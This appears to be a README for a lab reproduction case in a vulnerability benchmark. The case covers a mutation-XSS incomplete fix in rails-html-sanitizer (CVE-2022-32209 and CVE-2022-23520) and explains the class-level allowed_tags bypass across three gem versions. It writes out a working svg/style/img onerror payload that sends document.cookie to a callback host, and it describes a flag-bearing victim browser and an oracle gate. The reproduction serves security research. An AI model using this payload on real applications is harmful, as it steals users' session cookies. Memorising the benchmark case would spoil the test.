# rails_html_sanitizer_select_style

rails-html-sanitizer — CVE-2022-32209 -> CVE-2022-23520 (mutation XSS: the select/style tag
combination, HTML4 CDATA-under-`<style>` serialization vs browser HTML5 re-parse; CWE-79).
**Genuine incomplete fix; gate passed on real Docker** (repro.log: "VERDICT: GATE PASSED -- genuine
incomplete-fix pair"; GHSA-rrfc-7g8p-99q8: "due to an incomplete fix of CVE-2022-32209 ... if the
application developer has overridden the sanitizer's allowed tags to allow both 'select' and 'style'
elements").

V1 不完整修复的源码级分析见同目录 [INCOMPLETE_FIX_ANALYSIS.md](INCOMPLETE_FIX_ANALYSIS.md)。

REAL Sinatra/WEBrick sink app (`ruby:3.1-slim`, `app.rb`) gem-installs the REAL
`rails-html-sanitizer@RHS_VER` and runs the genuine `Rails::Html::SafeListSanitizer#sanitize` over
attacker HTML from `GET /?mode=<class|tags>&html=<payload>`, serving the sanitized output verbatim
into a page. `mode=tags` = per-call `sanitize(html, tags: OVERRIDE)`; `mode=class` = `sanitize(html)`
with the class-level `SafeListSanitizer.allowed_tags = OVERRIDE`. The allowlist OVERRIDES the default
to include BOTH `select` and `style` (+ svg/math foreign-content wrappers; `img`/`script` are NOT
allowed — the mutation promotes them). loofah 2.19.1 + nokogiri 1.13.10 are pinned IDENTICAL across
v0/v1/v2 (`loofah 2.19.1 has no html5_mode? -> loofah_using_html5? false -> HTML4 parser in use`),
so the SOLE variable is the sanitizer gem. A headless-Chromium `victim` (selenium grid `browser`
:4444) carries `${PCB_FLAG}` in its cookie and views the page; if the sanitized markup MUTATES on
browser parse into a live `<img onerror>`, it exfiltrates `document.cookie` to the internal
`callback` (:9000, `/c`, `/dump`, `/reset`) — JS EXECUTION proven, not reflection.

- **V0 = 1.4.2** (`:34820`) — no combination scrub -> `style` kept on BOTH paths -> `<style>` CDATA
  `<img>` emitted RAW -> executes -> seed reaches the flag. (pre-CVE-2022-32209)
- **V1 = 1.4.3** (`:34821`, target) — CVE-2022-32209 fix adds `remove_safelist_tag_combinations`
  (deletes `style` from the safelist when both `select` and `style` are allowed) but wires it ONLY
  into the per-call `options[:tags]` branch of `allowed_tags(options)`; the class-level fallback
  `self.class.allowed_tags` is NOT run through it -> `mode=tags` BLOCKED (`img` escaped
  `&lt;img&gt;`, `<style>` dropped), while `mode=class` keeps `style` -> RAW `<img>` -> the
  CVE-2022-23520 residual still executes. Incomplete fix.
- **V2 = 1.4.4** (`:34822`, CVE-2022-23520 fix) — the scrubber's cdata branch replaces the text node
  with `Loofah::HTML5::Scrub.cdata_escape(node)` when `cdata_needs_escaping?` -> ALL HTML4-CDATA
  content escaped (`&lt;img ...&gt;`) regardless of how tags were configured -> BOTH paths blocked.

Mutation-XSS channel: Nokogiri's HTML4 parser (libxml2) treats `<style>` content as CDATA needing no
escaping and serializes the inner `<img ...>` RAW; the HTML5 browser repairs the tree, pulling the
`<img>` out of the CDATA/foreign context into live element context so `onerror` fires. Execution is
demonstrated with the `<svg><style>` foreign-content member of the same mXSS class: plain
`<select><style><img>` is NON-executing in modern Chromium (the "in select" insertion mode drops the
img), whereas inside SVG the `<img>` is pulled out of `<style>` CDATA (case.json `poc.payload_note`).

- **Original trigger**: the payload
  `<svg><style><img src=x onerror="document.location='//callback:9000/c?f='+document.cookie"></style></svg>`
  via `mode=tags` (per-call `:tags`, CVE-2022-32209 API path).
- **Residual trigger**: the IDENTICAL payload via `mode=class` (class-level `allowed_tags` override,
  NO `:tags` option, CVE-2022-23520 path) — ONLY the API path differs; that difference IS the
  incomplete-fix gap the writeup names: "the new method remove_safelist_tag_combinations does not
  apply to that [class-level] list" ("A Tale of Two XSS in the Rails HTML Sanitizer", Dominic
  Breuker).

Gate (repro.log, live selenium/Chromium): original reaches flag@v0, blocked@v1 (tags scrub), blocked@v2;
residual reaches flag@v1 (class-level path skips the scrub = INCOMPLETE FIX) and on v0, blocked@v2
(cdata_escape closes the class-level path too). Run: `PCB_FLAG=... python3 oracle.py --gate` against
the already-up compose env (this case's oracle.py exposes `--gate`, `--probe original|bypass`,
`--version`; no `--run-gate`). See `repro.log` and `case.json`.
